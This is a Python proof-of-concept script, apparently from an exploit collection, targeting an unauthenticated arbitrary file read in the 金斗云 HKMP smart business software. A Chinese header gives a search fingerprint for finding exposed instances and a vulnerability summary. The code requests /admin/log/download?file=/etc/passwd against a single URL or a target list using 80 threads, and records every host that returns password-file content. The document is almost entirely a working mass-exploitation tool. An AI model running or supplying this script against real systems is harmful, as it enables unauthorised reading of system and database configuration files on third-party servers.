# 金斗云 HKMP智慧商业软件 download 任意文件读取漏洞
# body="金斗云 Copyright"
# 产品简介:金斗云智慧商业软件是一款功能强大、易于使用的智慧管理系统，通过智能化的管理工具，帮助企业实现高效经营、优化流程、降低成本，并提升客户体验。无论是珠宝门店、4S店还是其他零售、服务行业，金斗云都能提供量身定制的解决方案，助力企业实现数字化转型和智能化升级。帮助企业提升业绩、优化流程、降低成本，并增强客户体验。
# 漏洞概述:金斗云 HKMP智慧商业软件 download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m██╗  ██╗██╗  ██╗███╗   ███╗██████╗    ██████╗  ██████╗ ██╗    ██╗███╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
\x1b[36m██║  ██║██║ ██╔╝████╗ ████║██╔══██╗   ██╔══██╗██╔═══██╗██║    ██║████╗  ██║██║     ██╔═══██╗██╔══██╗██╔══██╗
\x1b[34m███████║█████╔╝ ██╔████╔██║██████╔╝   ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║██║     ██║   ██║███████║██║  ██║
\x1b[35m██╔══██║██╔═██╗ ██║╚██╔╝██║██╔═══╝    ██║  ██║██║   ██║██║███╗██║██║╚██╗██║██║     ██║   ██║██╔══██║██║  ██║
\x1b[31m██║  ██║██║  ██╗██║ ╚═╝ ██║██║███████╗██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗╚██████╔╝██║  ██║██████╔╝
\x1b[33m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  
                                                --author:Kucei
                                                --Version:金斗云 HKMP智慧商业软件 download 任意文件读取漏洞                                                  
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('金斗云 HKMP智慧商业软件 download 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/admin/log/download?file=/etc/passwd'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding': 'gzip'
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and ':0:0:' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('金斗云_HKMP智慧商业软件_download-ReadFile.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()